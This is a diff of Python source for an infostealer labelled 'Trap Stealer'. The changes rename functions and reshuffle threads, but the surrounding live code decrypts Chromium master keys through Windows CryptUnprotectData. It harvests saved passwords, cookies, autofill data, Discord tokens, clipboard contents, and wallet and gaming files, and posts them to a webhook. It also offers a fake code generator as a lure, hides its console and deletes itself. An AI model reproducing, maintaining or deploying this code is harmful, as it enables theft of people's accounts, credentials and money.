@@ -42,10 +42,9 @@ for module in requirements:
         subprocess.Popen(f"\"{executable}\" -m pip install {module[1]} --quiet", shell=True)
         time.sleep(3)
 
-
 from Crypto.Cipher import AES
-
 import requests
+
 def sql_connect(database_path):
     conn = sqlite3.connect(database_path)
     return conn
@@ -191,7 +190,7 @@ def GetData(blob_out):
     windll.kernel32.LocalFree(pbData)
     return buffer.raw
 
-def CryptUnprotectData(encrypted_bytes, entropy=b''):
+def cryptunproct(encrypted_bytes, entropy=b''):
     buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
     buffer_entropy = c_buffer(entropy, len(entropy))
     blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
@@ -204,6 +203,7 @@ def CryptUnprotectData(encrypted_bytes, entropy=b''):
 wltZip = []
 GamingZip = []
 OtherZip = []
+
 def fakegen():
     try:
         time.sleep(1)
@@ -220,7 +220,7 @@ def fakegen():
         count_generator = 0
         valid_url = random.randint(1, 1000)
         valid_test = -1
-        filename = input("Enter the filename to use for proxies (or press Enter to skip): ")
+        input("Enter the filename to use for proxies (or press Enter to skip): ")
         while True:
             essay = input("How many codes do you want to generate? (Enter a number): ")
             if not essay.isdigit() or int(essay) < 1:
@@ -252,8 +252,6 @@ def decrval(buff, master_key=None):
     
 
 def check_python_or_convert(file_path):
-    
-    
     _, file_extension = os.path.splitext(file_path)
 
     if ".py" in file_path:
@@ -262,7 +260,7 @@ def check_python_or_convert(file_path):
     file_path = os.path.splitext(file_path)[0] + ".exe"
 
     return file_path
-def Clipboard():
+def clip():
     try:
         command = 'Get-Clipboard -TextFormatType Text'
         result = subprocess.run(['powershell', '-Command', command], capture_output=True, text=True, check=True)
@@ -1249,7 +1247,7 @@ def GetDiscord(path, arg):
         pathKey = path + "/Local State"
         with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
         master_key = b64decode(local_state['os_crypt']['encrypted_key'])
-        master_key = CryptUnprotectData(master_key[5:])
+        master_key = cryptunproct(master_key[5:])
         
         for file in os.listdir(pathC):
             if file.endswith(".log") or file.endswith(".ldb"):
@@ -1270,15 +1268,7 @@ paswWords = []
 Passw = []
 
 def getPassw(path, arg):
-    def CryptUnprotectData(encrypted_bytes, entropy=b''):
-        buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
-        buffer_entropy = c_buffer(entropy, len(entropy))
-        blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
-        blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
-        blob_out = DATA_BLOB()
 
-        if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
-            return GetData(blob_out)
 
     def decrval(buff, master_key=None):
         starts = buff.decode(encoding='utf8', errors='ignore')[:3]
@@ -1311,7 +1301,7 @@ def getPassw(path, arg):
     pathKey = path + "/Local State"
     with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
     master_key = b64decode(local_state[es[::-1]][ess[::-1]])
-    master_key = CryptUnprotectData(master_key[5:])
+    master_key = cryptunproct(master_key[5:])
     keys = [
     'liam', ')moc.esabnioc//:sptth(]esabnioc[', ')moc.xilften//:sptth(]xilften[' ,')moc.rebu//:sptth(]rebu[' ,'otpyrc' ,')moc.npvsserpxe//:sptth(]npvsserpxe[' ,')moc.yensid//:sptth(]yensid[' ,')moc.buhnrop//:sptth(]buhnrop[' ,')moc.margelet//:sptth(]margelet[' ,')moc.lloryhcnurc//:sptth(]lloryhcnurc[' ,')moc.kooltuo//:sptth(]kooltuo[' ,')moc.liamtoh//:sptth(]liamtoh[' ,')moc.ecnanib//:sptth(]ecnanib[' ,'lles' ,'yub' ,')moc.xobx//:sptth(]xobx[' ,')moc.obh//:sptth(]obh[' ,')moc.noitatsyalp//:sptth(]noitatsyalp[' ,')moc.sserpxeila//:sptth(]sserpxeila[' ,')moc.yabe//:sptth(]yabe[' ,')moc.nozama//:sptth(]nozama[' ,')moc.nigiro//:sptth(]nigiro[' ,')moc.lapyap//:sptth(]lapyap[' ,'knab' ,')ten.tfarcenim//:sptth(]tfarcenim[' ,')moc.hctiwt//:sptth(]hctiwt[' ,')moc.xolbor//:sptth(]xolbor[' ,')moc.oohay//:sptth(]oohay[' ,')moc.yfitops//:sptth(]yfitops[' ,')moc.semagcipe//:sptth(]semagcipe[' ,'drac' ,')moc.koobecaf//:sptth(]koobecaf[' ,')moc.rettiwt//:sptth(]rettiwt[' ,')moc.kotkit//:sptth(]kotkit[']
     for row in data: 
@@ -1343,7 +1333,7 @@ def getinfo():
             globalinfo = "Couldn't get global information"
             
         try:
-            clipboardtext = Clipboard()
+            clipboardtext = clip()
         except:
             clipboardtext = "Couldn't get clipboard"
         data = {
@@ -1827,7 +1817,7 @@ def getCook(path, arg):
 
         with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
         master_key = b64decode(local_state['os_crypt']['encrypted_key'])
-        master_key = CryptUnprotectData(master_key[5:])
+        master_key = cryptunproct(master_key[5:])
   
         for row in data: 
             if row[0] != '':
@@ -1860,21 +1850,21 @@ def GatherZips(paths1, paths2, paths3):
     for thread in thttht: 
         thread.join()
     global wltZip, GamingZip, OtherZip
-    wal, ga, ot = "",'',''
+    wals, game, otth = "",'',''
     azz = 'stellaW'
     if len(wltZip) != 0:
         
-        wal = f":coin:  •  {azz[::-1]}\n"
+        wals = f":coin:  •  {azz[::-1]}\n"
         for i in wltZip:
-            wal += f"└─ [{i[0]}]({i[1]})\n"
+            wals += f"└─ [{i[0]}]({i[1]})\n"
     if len(GamingZip) != 0:
-        ga = ":video_game:  •  Gaming:\n"
+        game = ":video_game:  •  Gaming:\n"
         for i in GamingZip:
-            ga += f"└─ [{i[0]}]({i[1]})\n"
+            game += f"└─ [{i[0]}]({i[1]})\n"
     if len(OtherZip) != 0:
-        ot = ":tickets:  •  Apps\n"
+        otth = ":tickets:  •  Apps\n"
         for i in OtherZip:
-            ot += f"└─ [{i[0]}]({i[1]})\n"
+            otth += f"└─ [{i[0]}]({i[1]})\n"
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
@@ -1884,7 +1874,7 @@ def GatherZips(paths1, paths2, paths3):
         "embeds": [
             {
             "title": "Trap Stealer Zips",
-            "description": f"{wal}\n{ga}\n{ot}",
+            "description": f"{wals}\n{game}\n{otth}",
             "color": 0xffb6c1,
             "footer": {
                 "text": "Trap Stealer ZIP",
@@ -1896,6 +1886,8 @@ def GatherZips(paths1, paths2, paths3):
         "attachments": []
     }
     LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+
+import os
 
 def delete_self(script_path):
     try:
@@ -1939,6 +1931,7 @@ def GatherAll():
     ]
     Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]
     aa = []
+    qq = []
     if hidewindow == True:
         try:
             hide_console1()
@@ -1975,22 +1968,22 @@ def GatherAll():
     for patt in browserPaths:
         pa = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
         pa.start()
-        aa.append(pa)
+        qq.append(pa)
         
     for patt in browserPaths: 
         getc = threading.Thread(target=getCook, args=[patt[0], patt[4]])
         getc.start()
-        aa.append(getc)
+        qq.append(getc)
         
         
     for patt in browserPaths:
         autof = threading.Thread(target=getAutofill,args=[patt[0], patt[3]])
         autof.start()
-        aa.append(autof)
+        qq.append(autof)
         
     frfc = threading.Thread(target=frcook)
     frfc.start()
-    aa.append(frfc)
+    qq.append(frfc)
         
     for patt in browserPaths:
         tokq = threading.Thread(target=getTokq, args=[patt[0], patt[2]])
@@ -2007,8 +2000,9 @@ def GatherAll():
         aa.append(di)
 
     
-    for thread in aa:
+    for thread in qq:
         thread.join()
+        
     paaz_thread = threading.Thread(target=paaz)
     paaz_thread.start()
     aa.append(paaz_thread)
